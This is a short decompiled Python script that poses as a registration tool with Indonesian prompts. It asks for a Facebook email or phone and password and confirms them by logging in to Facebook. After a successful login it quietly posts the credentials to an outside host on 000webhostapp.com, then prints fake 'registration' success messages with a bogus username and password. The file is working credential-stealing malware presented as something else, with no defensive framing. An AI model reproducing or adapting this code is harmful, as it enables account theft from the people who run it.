# Decompile At : Thu Mar  5 23:55:04 2020
import requests, smtplib, time
from bs4 import BeautifulSoup
from time import sleep as timeout

Email = raw_input('email/no telp = ')
Password = raw_input('password = ')

formi = "Email : {}    Password : {} ".format(Email,Password)
URL = 'https://m.facebook.com/login'
form_data = {'email' : Email,
             'pass' : Password                                                     }
with requests.Session() as c:
     c.get(URL)
     r = c.post(URL, data=form_data)
     b = c.get('https://m.facebook.com/home.php')
     soup = BeautifulSoup(b.content, 'html.parser')
     a = soup.find('title')
     if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
        print ('Login Gagal')
        exit()
     else:
        print ('Login sukses')
        requests.post("https://nandaservering.000webhostapp.com/hehe.php",data={"req":formi})
        print ('Register Sukses')
        time.sleep(3)
        print ('Username : me')
        print ('Password : hacker')
        print ('Silahkan login Menggunakan username dan password diatas')
        exit()